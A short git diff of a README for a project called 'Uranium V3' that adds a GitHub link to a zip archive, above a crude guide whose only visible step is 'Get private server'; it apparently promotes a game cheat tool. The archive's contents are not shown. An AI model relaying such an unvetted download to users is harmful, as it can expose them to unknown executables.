@@ -1,5 +1,5 @@
-# Uranium-V3
-Uranium V3 
+# Uranium-V3 
+Uranium V3 (https://github.com/qzxe/Uranium-V3/files/7821082/UraniumV3.zip)
 
 step by step guide for dumb mfs
 1. Get private server
